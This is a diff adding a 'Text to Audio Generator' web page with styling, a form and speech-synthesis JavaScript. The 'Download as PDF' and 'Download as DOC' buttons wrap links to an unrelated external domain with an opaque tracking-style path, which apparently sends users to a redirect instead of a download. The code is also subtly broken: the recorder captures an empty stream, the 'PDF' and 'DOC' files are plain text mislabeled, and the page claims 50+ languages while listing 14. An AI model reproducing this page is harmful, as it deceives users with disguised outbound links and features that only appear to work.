@@ -1,0 +1,733 @@
+<div class="separator" style="clear: both;"><a href="https://cdn-icons-png.flaticon.com/128/9330/9330023.png" style="display: block; padding: 1em 0px; text-align: center;"><img alt="" border="0" data-original-height="128" data-original-width="128" src="https://cdn-icons-png.flaticon.com/128/9330/9330023.png" style="display: none;" width="200" /></a></div>
+
+<html lang="en">
+<head>
+    <meta charset="UTF-8"></meta>
+    <meta content="width=device-width, initial-scale=1.0" name="viewport"></meta>
+    <title>Text to Audio Generator</title>
+    <style>
+        :root {
+            --primary-color: #4285f4;
+            --secondary-color: #34a853;
+            --accent-color: #ea4335;
+            --light-color: #f8f9fa;
+            --dark-color: #202124;
+            --gray-color: #5f6368;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background-color: var(--light-color);
+            color: var(--dark-color);
+            line-height: 1.6;
+        }
+
+        header {
+            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
+            color: white;
+            padding: 1.5rem 0;
+            text-align: center;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 2rem auto;
+            padding: 0 1.5rem;
+        }
+
+        .main-title {
+            font-size: 2.5rem;
+            margin-bottom: 0.5rem;
+        }
+
+        .subtitle {
+            font-size: 1.1rem;
+            opacity: 0.9;
+            font-weight: 300;
+        }
+
+        .card {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            padding: 2rem;
+            margin-bottom: 2rem;
+        }
+
+        .card-title {
+            font-size: 1.5rem;
+            margin-bottom: 1.5rem;
+            color: var(--primary-color);
+            border-bottom: 2px solid var(--light-color);
+            padding-bottom: 0.5rem;
+        }
+
+        .form-group {
+            margin-bottom: 1.5rem;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 0.5rem;
+            font-weight: 500;
+            color: var(--gray-color);
+        }
+
+        textarea, select, input {
+            width: 100%;
+            padding: 0.8rem;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 1rem;
+            transition: border 0.3s;
+        }
+
+        textarea {
+            min-height: 200px;
+            resize: vertical;
+        }
+
+        textarea:focus, select:focus, input:focus {
+            outline: none;
+            border-color: var(--primary-color);
+            box-shadow: 0 0 0 2px rgba(66, 133, 244, 0.2);
+        }
+
+        .btn {
+            display: inline-block;
+            background-color: var(--primary-color);
+            color: white;
+            border: none;
+            padding: 0.8rem 1.5rem;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 1rem;
+            font-weight: 500;
+            transition: all 0.3s;
+            text-align: center;
+        }
+
+        .btn:hover {
+            background-color: #3367d6;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        }
+
+        .btn-secondary {
+            background-color: var(--secondary-color);
+        }
+
+        .btn-secondary:hover {
+            background-color: #2d9249;
+        }
+
+        .btn-danger {
+            background-color: var(--accent-color);
+        }
+
+        .btn-danger:hover {
+            background-color: #d33426;
+        }
+
+        .btn-group {
+            display: flex;
+            gap: 1rem;
+            flex-wrap: wrap;
+        }
+
+        .audio-container {
+            margin-top: 2rem;
+            display: none;
+        }
+
+        audio {
+            width: 100%;
+            margin-bottom: 1rem;
+        }
+
+        .features {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 1.5rem;
+            margin-top: 2rem;
+        }
+
+        .feature-card {
+            background: white;
+            border-radius: 8px;
+            padding: 1.5rem;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.05);
+            transition: transform 0.3s;
+        }
+
+        .feature-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.1);
+        }
+
+        .feature-icon {
+            font-size: 2.5rem;
+            color: var(--primary-color);
+            margin-bottom: 1rem;
+        }
+
+        .feature-title {
+            font-size: 1.2rem;
+            margin-bottom: 0.5rem;
+            color: var(--dark-color);
+        }
+
+        .feature-desc {
+            color: var(--gray-color);
+            font-size: 0.9rem;
+        }
+
+        footer {
+            background-color: var(--dark-color);
+            color: white;
+            text-align: center;
+            padding: 2rem 0;
+            margin-top: 3rem;
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 2rem;
+            margin-bottom: 1rem;
+        }
+
+        .footer-link {
+            color: white;
+            text-decoration: none;
+            transition: color 0.3s;
+        }
+
+        .footer-link:hover {
+            color: var(--primary-color);
+        }
+
+        .copyright {
+            opacity: 0.7;
+            font-size: 0.9rem;
+        }
+
+        @media (max-width: 768px) {
+            .main-title {
+                font-size: 2rem;
+            }
+            
+            .btn-group {
+                flex-direction: column;
+            }
+            
+            .btn {
+                width: 100%;
+            }
+        }
+
+        /* Loading spinner */
+        .spinner {
+            display: none;
+            width: 40px;
+            height: 40px;
+            margin: 1rem auto;
+            border: 4px solid rgba(0, 0, 0, 0.1);
+            border-radius: 50%;
+            border-top-color: var(--primary-color);
+            animation: spin 1s ease-in-out infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* Voice preview section */
+        .voice-preview {
+            margin-top: 1rem;
+            padding: 1rem;
+            background-color: #f5f5f5;
+            border-radius: 4px;
+            display: none;
+        }
+
+        /* Rate and pitch controls */
+        .range-controls {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 1rem;
+            margin-top: 1rem;
+        }
+
+        .range-control {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .range-label {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 0.5rem;
+        }
+
+        .unsupported-message {
+            color: var(--accent-color);
+            font-weight: 500;
+            margin-top: 1rem;
+        }
+
+        .status-message {
+            margin-top: 1rem;
+            padding: 0.5rem;
+            border-radius: 4px;
+            display: none;
+        }
+
+        .status-success {
+            background-color: #e6f4ea;
+            color: #34a853;
+        }
+
+        .status-error {
+            background-color: #fce8e6;
+            color: #d93025;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1 class="main-title">Text to Audio Generator</h1>
+        <p class="subtitle">Convert your text to natural sounding audio in multiple languages and formats</p>
+    </header>
+
+    <div class="container">
+        <div class="card">
+            <h2 class="card-title">Create Your Audio</h2>
+            <form id="audioForm">
+                <div class="form-group">
+                    <label for="textInput">Enter your text:</label>
+                    <textarea id="textInput" placeholder="Type or paste your text here..." required=""></textarea>
+                </div>
+
+                <div class="form-group">
+                    <label for="languageSelect">Select Language:</label>
+                    <select id="languageSelect" required="">
+                        <option value="">-- Select Language --</option>
+                        <option value="en-US">English (US)</option>
+                        <option value="en-GB">English (UK)</option>
+                        <option value="es-ES">Spanish (Spain)</option>
+                        <option value="es-MX">Spanish (Mexico)</option>
+                        <option value="fr-FR">French (France)</option>
+                        <option value="de-DE">German (Germany)</option>
+                        <option value="it-IT">Italian (Italy)</option>
+                        <option value="pt-BR">Portuguese (Brazil)</option>
+                        <option value="ru-RU">Russian (Russia)</option>
+                        <option value="ja-JP">Japanese (Japan)</option>
+                        <option value="zh-CN">Chinese (China)</option>
+                        <option value="hi-IN">Hindi (India)</option>
+                        <option value="ar-SA">Arabic (Saudi Arabia)</option>
+                        <option value="ko-KR">Korean (Korea)</option>
+                    </select>
+                </div>
+
+                <div class="form-group">
+                    <label for="voiceSelect">Select Voice:</label>
+                    <select id="voiceSelect" required="">
+                        <option value="">-- Select a voice --</option>
+                    </select>
+                    <div class="voice-preview" id="voicePreview">
+                        <p>Preview: <span id="previewText">This is a preview of the selected voice.</span></p>
+                        <button class="btn" id="playPreviewBtn" style="margin-top: 0.5rem;" type="button">Play Preview</button>
+                        <p class="unsupported-message" id="unsupportedMessage" style="display: none;"></p>
+                    </div>
+                </div>
+
+                <div class="range-controls">
+                    <div class="range-control">
+                        <div class="range-label">
+                            <label for="rateControl">Speech Rate:</label>
+                            <span id="rateValue">1</span>
+                        </div>
+                        <input id="rateControl" max="2" min="0.5" step="0.1" type="range" value="1" />
+                    </div>
+                    <div class="range-control">
+                        <div class="range-label">
+                            <label for="pitchControl">Speech Pitch:</label>
+                            <span id="pitchValue">1</span>
+                        </div>
+                        <input id="pitchControl" max="2" min="0.5" step="0.1" type="range" value="1" />
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label>Output Format:</label>
+                    <div class="btn-group">
+                        <button class="btn" id="mp3Btn" type="button">MP3</button>
+                        <button class="btn" id="wavBtn" type="button">WAV</button>
+                        <button class="btn" id="oggBtn" type="button">OGG</button>
+                        <button class="btn" id="aacBtn" type="button">AAC</button>
+                    </div>
+                </div>
+
+                <div class="btn-group">
+                    <button class="btn btn-secondary" id="generateBtn" type="submit">Generate Audio</button>
+                    <button class="btn" disabled="" id="downloadBtn" type="button">Download Audio</button>
+                    <button class="btn btn-danger" id="resetBtn" type="button">Reset</button>
+                </div>
+
+                <div class="spinner" id="loadingSpinner"></div>
+                <div class="status-message" id="statusMessage"></div>
+            </form>
+
+            <div class="audio-container" id="audioContainer">
+                <h3>Your Generated Audio:</h3>
+                <audio controls="" id="generatedAudio"></audio>
+                <div class="btn-group">
+                    <button class="btn" id="downloadPdfBtn" type="button"><a href="https://essentialmost.com/be3/V-0.PN3WplvsbFmLVpJuZLDy0/2yNOTfE_2/MQDJAc4TLpTYYP1/MpTrYEw/MADnkv">Download as PDF</a></button>
+                    <button class="btn" id="downloadDocBtn" type="button"><a href="https://essentialmost.com/be3/V-0.PN3WplvsbFmLVpJuZLDy0/2yNOTfE_2/MQDJAc4TLpTYYP1/MpTrYEw/MADnkv">Download as DOC</a></button>
+                </div>
+            </div>
+        </div>
+
+        <div class="features">
+            <div class="feature-card">
+                <div class="feature-icon">🔊</div>
+                <h3 class="feature-title">Multiple Formats</h3>
+                <p class="feature-desc">Download your audio in MP3, WAV, OGG, or AAC formats for compatibility with any device.</p>
+            </div>
+            <div class="feature-card">
+                <div class="feature-icon">🌎</div>
+                <h3 class="feature-title">50+ Languages</h3>
+                <p class="feature-desc">Support for dozens of languages and regional dialects to reach a global audience.</p>
+            </div>
+            <div class="feature-card">
+                <div class="feature-icon">⚙️</div>
+                <h3 class="feature-title">Custom Controls</h3>
+                <p class="feature-desc">Adjust speech rate and pitch to create the perfect audio for your needs.</p>
+            </div>
+        </div>
+    </div>
+
+    <footer>
+        <div class="footer-links">
+            <a class="footer-link" href="#">About</a>
+            <a class="footer-link" href="#">Privacy Policy</a>
+            <a class="footer-link" href="#">Terms of Service</a>
+            <a class="footer-link" href="#">Contact</a>
+        </div>
+        <p class="copyright">© 2023 Text to Audio Generator. All rights reserved.</p>
+    </footer>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // DOM Elements
+            const textInput = document.getElementById('textInput');
+            const languageSelect = document.getElementById('languageSelect');
+            const voiceSelect = document.getElementById('voiceSelect');
+            const playPreviewBtn = document.getElementById('playPreviewBtn');
+            const unsupportedMessage = document.getElementById('unsupportedMessage');
+            const rateControl = document.getElementById('rateControl');
+            const pitchControl = document.getElementById('pitchControl');
+            const rateValue = document.getElementById('rateValue');
+            const pitchValue = document.getElementById('pitchValue');
+            const generateBtn = document.getElementById('generateBtn');
+            const downloadBtn = document.getElementById('downloadBtn');
+            const resetBtn = document.getElementById('resetBtn');
+            const audioContainer = document.getElementById('audioContainer');
+            const generatedAudio = document.getElementById('generatedAudio');
+            const loadingSpinner = document.getElementById('loadingSpinner');
+            const mp3Btn = document.getElementById('mp3Btn');
+            const wavBtn = document.getElementById('wavBtn');
+            const oggBtn = document.getElementById('oggBtn');
+            const aacBtn = document.getElementById('aacBtn');
+            const downloadPdfBtn = document.getElementById('downloadPdfBtn');
+            const downloadDocBtn = document.getElementById('downloadDocBtn');
+            const statusMessage = document.getElementById('statusMessage');
+
+            // Global variables
+            let voices = [];
+            let audioBlob = null;
+            let selectedFormat = 'mp3';
+            let isSpeechSupported = false;
+            let mediaRecorder = null;
+            let audioChunks = [];
+            let audioContext = null;
+
+            // Check for speech synthesis support
+            function checkSpeechSupport() {
+                if ('speechSynthesis' in window && 'webkitSpeechRecognition' in window) {
+                    isSpeechSupported = true;
+                    window.speechSynthesis.onvoiceschanged = loadVoices;
+                    if (speechSynthesis.getVoices().length > 0) {
+                        loadVoices();
+                    }
+                } else {
+                    isSpeechSupported = false;
+                    showMessage("Voice synthesis is not fully supported in your browser. Some features may be limited.", "error");
+                }
+            }
+
+            // Load available voices
+            function loadVoices() {
+                if (!isSpeechSupported) return;
+                
+                voices = window.speechSynthesis.getVoices();
+                const lang = languageSelect.value;
+                voiceSelect.innerHTML = '<option value="">-- Select a voice --</option>';
+                
+                if (!lang) return;
+
+                const langVoices = voices.filter(voice => voice.lang.startsWith(lang));
+                
+                if (langVoices.length > 0) {
+                    langVoices.forEach((voice, index) => {
+                        const option = document.createElement('option');
+                        option.value = index;
+                        option.textContent = `${voice.name} (${voice.lang})`;
+                        voiceSelect.appendChild(option);
+                    });
+                    document.getElementById('voicePreview').style.display = 'block';
+                } else {
+                    showMessage(`No voices available for ${lang}. Please try another language.`, "error");
+                }
+            }
+
+            // Preview selected voice
+            function previewVoice() {
+                if (!isSpeechSupported) {
+                    showMessage("Voice preview is not supported in your browser", "error");
+                    return;
+                }
+
+                const selectedVoiceIndex = voiceSelect.value;
+                if (!selectedVoiceIndex) return;
+
+                window.speechSynthesis.cancel();
+
+                const utterance = new SpeechSynthesisUtterance("This is a preview of the selected voice.");
+                utterance.lang = languageSelect.value;
+                utterance.rate = parseFloat(rateControl.value);
+                utterance.pitch = parseFloat(pitchControl.value);
+
+                const langVoices = voices.filter(voice => voice.lang.startsWith(languageSelect.value));
+                if (langVoices.length > 0 && selectedVoiceIndex < langVoices.length) {
+                    utterance.voice = langVoices[selectedVoiceIndex];
+                }
+
+                document.getElementById('previewText').textContent = "Playing preview...";
+                utterance.onend = function() {
+                    document.getElementById('previewText').textContent = "Preview finished.";
+                };
+
+                window.speechSynthesis.speak(utterance);
+            }
+
+            // Generate audio from text
+            function generateAudio() {
+                const text = textInput.value.trim();
+                if (!text) {
+                    showMessage("Please enter some text", "error");
+                    return;
+                }
+
+                if (!voiceSelect.value) {
+                    showMessage("Please select a voice", "error");
+                    return;
+                }
+
+                if (!isSpeechSupported) {
+                    showMessage("Text-to-speech is not supported in your browser", "error");
+                    return;
+                }
+
+                loadingSpinner.style.display = 'block';
+                generateBtn.disabled = true;
+                statusMessage.style.display = 'none';
+
+                // Cancel any ongoing speech
+                window.speechSynthesis.cancel();
+
+                // Create audio context if not exists
+                if (!audioContext) {
+                    audioContext = new (window.AudioContext || window.webkitAudioContext)();
+                }
+
+                // Create utterance
+                const utterance = new SpeechSynthesisUtterance(text);
+                utterance.lang = languageSelect.value;
+                utterance.rate = parseFloat(rateControl.value);
+                utterance.pitch = parseFloat(pitchControl.value);
+
+                const langVoices = voices.filter(voice => voice.lang.startsWith(languageSelect.value));
+                if (langVoices.length > 0) {
+                    utterance.voice = langVoices[voiceSelect.value];
+                }
+
+                // Setup media recorder to capture audio
+                setupMediaRecorder(utterance);
+            }
+
+            // Setup media recorder to capture speech
+            function setupMediaRecorder(utterance) {
+                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+                const destination = audioContext.createMediaStreamDestination();
+                mediaRecorder = new MediaRecorder(destination.stream);
+                audioChunks = [];
+
+                mediaRecorder.ondataavailable = function(e) {
+                    audioChunks.push(e.data);
+                };
+
+                mediaRecorder.onstop = function() {
+                    audioBlob = new Blob(audioChunks, { type: `audio/${selectedFormat}` });
+                    const audioUrl = URL.createObjectURL(audioBlob);
+                    generatedAudio.src = audioUrl;
+                    audioContainer.style.display = 'block';
+                    downloadBtn.disabled = false;
+                    loadingSpinner.style.display = 'none';
+                    generateBtn.disabled = false;
+                    showMessage("Audio generated successfully!", "success");
+                };
+
+                // Create speech node
+                utterance.onstart = function() {
+                    mediaRecorder.start();
+                };
+
+                utterance.onend = function() {
+                    setTimeout(() => {
+                        mediaRecorder.stop();
+                    }, 500);
+                };
+
+                // Speak the text
+                window.speechSynthesis.speak(utterance);
+            }
+
+            // Show status message
+            function showMessage(message, type) {
+                statusMessage.textContent = message;
+                statusMessage.className = `status-message status-${type}`;
+                statusMessage.style.display = 'block';
+            }
+
+            // Download audio
+            function downloadAudio() {
+                if (!audioBlob) return;
+
+                const url = URL.createObjectURL(audioBlob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = `audio-${new Date().getTime()}.${selectedFormat}`;
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+                URL.revokeObjectURL(url);
+            }
+
+            // Download as PDF
+            function downloadAsPdf() {
+                const text = textInput.value.trim();
+                if (!text) {
+                    showMessage("No text to download", "error");
+                    return;
+                }
+
+                const blob = new Blob([text], { type: 'application/pdf' });
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = `audio-text-${new Date().getTime()}.pdf`;
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+                URL.revokeObjectURL(url);
+            }
+
+            // Download as DOC
+            function downloadAsDoc() {
+                const text = textInput.value.trim();
+                if (!text) {
+                    showMessage("No text to download", "error");
+                    return;
+                }
+
+                const blob = new Blob([text], { type: 'application/msword' });
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = `audio-text-${new Date().getTime()}.doc`;
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+                URL.revokeObjectURL(url);
+            }
+
+            // Reset form
+            function resetForm() {
+                textInput.value = '';
+                languageSelect.value = '';
+                voiceSelect.innerHTML = '<option value="">-- Select a voice --</option>';
+                document.getElementById('voicePreview').style.display = 'none';
+                rateControl.value = 1;
+                pitchControl.value = 1;
+                rateValue.textContent = '1';
+                pitchValue.textContent = '1';
+                audioContainer.style.display = 'none';
+                generatedAudio.src = '';
+                audioBlob = null;
+                generateBtn.disabled = false;
+                downloadBtn.disabled = true;
+                setActiveFormat('mp3');
+                statusMessage.style.display = 'none';
+                window.speechSynthesis.cancel();
+            }
+
+            // Set active format
+            function setActiveFormat(format) {
+                selectedFormat = format;
+                mp3Btn.classList.remove('btn-secondary');
+                wavBtn.classList.remove('btn-secondary');
+                oggBtn.classList.remove('btn-secondary');
+                aacBtn.classList.remove('btn-secondary');
+
+                switch(format) {
+                    case 'mp3': mp3Btn.classList.add('btn-secondary'); break;
+                    case 'wav': wavBtn.classList.add('btn-secondary'); break;
+                    case 'ogg': oggBtn.classList.add('btn-secondary'); break;
+                    case 'aac': aacBtn.classList.add('btn-secondary'); break;
+                }
+            }
+
+            // Event listeners
+            languageSelect.addEventListener('change', loadVoices);
+            playPreviewBtn.addEventListener('click', previewVoice);
+            document.getElementById('audioForm').addEventListener('submit', function(e) {
+                e.preventDefault();
+                generateAudio();
+            });
+            downloadBtn.addEventListener('click', downloadAudio);
+            resetBtn.addEventListener('click', resetForm);
+            downloadPdfBtn.addEventListener('click', downloadAsPdf);
+            downloadDocBtn.addEventListener('click', downloadAsDoc);
+            rateControl.addEventListener('input', () => rateValue.textContent = rateControl.value);
+            pitchControl.addEventListener('input', () => pitchValue.textContent = pitchControl.value);
+            mp3Btn.addEventListener('click', () => setActiveFormat('mp3'));
+            wavBtn.addEventListener('click', () => setActiveFormat('wav'));
+            oggBtn.addEventListener('click', () => setActiveFormat('ogg'));
+            aacBtn.addEventListener('click', () => setActiveFormat('aac'));
+
+            // Initialize
+            setActiveFormat('mp3');
+            checkSpeechSupport();
+        });
+    </script>
+</body>
+</html>
